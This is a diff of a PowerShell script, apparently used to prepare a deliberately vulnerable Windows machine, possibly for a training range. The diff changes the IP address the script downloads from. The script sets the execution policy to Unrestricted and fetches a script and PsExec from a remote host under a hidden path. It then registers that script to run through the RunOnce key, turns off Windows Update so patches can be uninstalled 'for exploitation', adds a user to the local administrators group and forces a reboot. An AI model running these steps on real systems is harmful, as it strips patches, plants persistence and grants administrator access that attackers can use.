@@ -25,10 +25,10 @@
             Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
             
             # ----- UNINSTALLS KBs FOR EXPLOITATION
-            Invoke-WebRequest -Uri "10.50.20.181/linux/KB.ps1" -OutFile "C:\KB.ps1"
-            (new-object Net.WebClient).DownloadFile( "http://10.50.20.181/linux/KB.ps1", "C:\KB.ps1" )
-            Invoke-WebRequest -Uri "10.50.20.181/windows/.hidden/TTW/PsExec.exe" -OutFile "C:\PsExec.exe"
-            (new-object Net.WebClient).DownloadFile( "http://10.50.20.181/windows/.hidden/TTW/PsExec.exe", "C:\PsExec.exe" )
+            Invoke-WebRequest -Uri "10.50.23.39/linux/KB.ps1" -OutFile "C:\KB.ps1"
+            (new-object Net.WebClient).DownloadFile( "http://10.50.23.39/linux/KB.ps1", "C:\KB.ps1" )
+            Invoke-WebRequest -Uri "10.50.23.39/windows/.hidden/TTW/PsExec.exe" -OutFile "C:\PsExec.exe"
+            (new-object Net.WebClient).DownloadFile( "http://10.50.23.39/windows/.hidden/TTW/PsExec.exe", "C:\PsExec.exe" )
             Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -name "KB" 'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -noprofile -sta -File "C:\KB.ps1"'
             New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" -Name AUOptions -Value 1 -PropertyType Dword | Out-Null
             get-service wuauserv | stop-service -Force
@@ -47,4 +47,4 @@
             net localgroup administrators /add $user
 
             exit 1001
-            shutdown -r -f
+            shutdown /r /f /t 0
